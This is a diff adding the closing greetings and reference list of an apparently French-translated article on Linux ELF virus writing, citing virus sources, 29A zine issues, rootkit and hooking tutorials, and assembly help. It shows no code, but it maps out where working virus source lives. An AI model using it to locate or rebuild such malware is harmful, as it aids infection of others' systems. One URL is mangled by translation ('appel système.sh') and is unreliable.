+jduck, botvx, mrphrazer, lauriewired
+0daysimpson, zeta, dnz, srsns, xcellerator, bane, h0wdy, gren 
+Aaron DeVera
+Tout le monde dans la fosse à déchets / le club informatique hanté et tous mes potes proches et lointains
+ilysm xoxoxoxoxoxxo 
+
+
+Références /////////////////////////////////////////////////////////////////////
+
+
+[1] "Unix Viruses," Silvio Cesare, https://web.archive.org/web/20020604060624/http://www.big.net.au/~silvio/unix-virus.txt 
+[2] "UNIX ELF Parasites and virus," Silvio Cesare, October 1998 https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix02.htm 
+[3 — same as 1, different URL] "UNIX Viruses" Silvio Cesare, October 1998 https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix01.htm 
+[4] "The VIT(Vit.4096) Virus," Silvio Cesare, October 1998 https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
+[4a]"VIT Virus: VIT description," Silvio Cesare, October 1998 https://web.archive.org/web/20020228014729/http://www.big.net.au/~silvio/vit.txt 
+[4b]"VIT Virus: VIT source," Silvio Cesare, October 1998, https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html (navigate to it from this page; I'm not putting the link to the tarball here so that no one accidentally downloads it. yw.)
+[5] "Shared Library Call Redirection via ELF PLT Infection", Silvio Cesare, Phrack, Volume 0xa Issue 0x38, 05.01.2000, 0x07[0x10], http://phrack.org/issues/56/7.html#article 
+[6] "Getdents.old.att" Github, sblip https://gist.github.com/jamichaels/fd6bca66879da9ec0efe 
+[7] "ASM Tutorial for Linux n' ELF file format", BY LiTtLe VxW, 29A issue #8
+[8] "Linux virus writing tutorial" [v1.0 at xx/12/99], by mandragore, from Feathered Serpents, 29A issue #4
+[9] "Half virus: Linux.A.443," Pavel Pech (aka TheKing1980), 03/02/2002, 29A issue #6
+[10] "Linux Mutation Engine (source code) [LiME] Version: 0.2.0," écrit par zhugejin à Taipei, Taïwan ; Date : 2000/10/10, Dernière mise à jour : 2001/02/28, numéro 29A #6
+[11] "Win32/Linux.Winux", by Benny/29A, 29A issue #6
+[12] "Metamorphism in practice or How I made MetaPHOR and what I've learnt", by The Mental Driller/29A, 29A issue #6
+[13] "Skeksi virus," elfmaster https://github.com/elfmaster/skeksi_virus 
+[14] "Linux.Nasty.asm," TMZ, 2021, tmp.0ut, volume 1 https://tmpout.sh/1/Linux.Nasty.asm 
+[15] "Linux.Nasty: Assembly x64 ELF virus," TMZ, 2021, https://www.guitmz.com/linux-nasty-elf-virus/ 
+[16] Retour au Point d'Entrée Original malgré PIE", s0lden, tmp.0ut, volume 1, https://tmpout.sh/1/11.html 
+[17] S01den and Sblip, tmp.0ut, volume 1, https://tmpout.sh/1/Linux.Kropotkine.asm   
+[18] anansi, sad0p, https://github.com/sad0p/anansi 
+[19] tmp.0ut "Awesome ELF", https://github.com/tmpout/awesome-elf
+
+
+Misc. Resources/Further Reading ////////////////////////////////////////////////
+
+
+Devhell Labs and Phrack Magazine present
+"The Cerberus ELF Interface," 
+mayhem
+Phrack Inc., Volume 0x0b, Issue 0x3d, Phile #0x08 of 0x0f http://phrack.org/issues/61/8.html
+
+
+"IA32 Advanced Function Hooking," 
+mayhem
+December 08th 2001, Phrack Inc. Volume 0x0b, Issue 0x3a, Phile #0x08 of 0x0e
+http://phrack.org/issues/58/8.html#article
+
+
+The Xcellerator
+Linux Rootkits: Part 2
+https://xcellerator.github.io/posts/linux_rootkits_02/ 
+
+
+"Manually Creating an ELF Executable"  https://web.archive.org/web/20140130143820/http://robinhoksbergen.com/papers/howto_elf.html 
+
+linux-re-101
+michalmalik
+https://github.com/michalmalik/linux-re-101/blob/master/README.md 
+
+
+Misc references on various asm programming techniques //////////////////////////
+
+
+TMZ's appel système pages:
+"x64," appel système.sh, TMZ
+https://x64.appel système.sh/
+
+
+Linux getdents man page:
+https://man7.org/linux/man-pages/man2/getdents.2.html
+
+Reading dir entries
+"readdir() — Read an entry from a directory"
+IBM
+https://www.ibm.com/docs/en/zos/2.3.0?topic=functions-readdir-read-entry-from-directory 
+
+
+Misc references on using structs in asm ////////////////////////////////////////
+
+
+"NASM - Chapter 5: Standard macros"
+https://www.nasm.us/xdoc/2.15/html/nasmdoc5.html
+
+
+"About declaring and initializing a structure in Fasm assembly"
+https://stackoverflow.com/questions/41929091/about-declaring-and-initializing-a-structure-in-fasm-assembly
+
+
+"Pointer for the first struct member list in nasm assembly"
+https://stackoverflow.com/questions/23299846/pointer-for-the-first-struct-member-list-in-nasm-assembly
+
+
+"Nasm - access struct elements by value and by address
+https://stackoverflow.com/questions/57540758/nasm-access-struct-elements-by-value-and-by-address
+
+
+"Accessing struc members NASM Assembly"
+https://stackoverflow.com/questions/70477162/accessing-struc-members-nasm-assembly
+
+
+"reading file's content and printing it to stdout in assembly x64"
+https://stackoverflow.com/questions/64498923/reading-files-content-and-printing-it-to-stdout-in-assembly-x64 
+
+
+
+[ Traduction par Tedsig42 ]
+</pre></div></body></html>
+
+
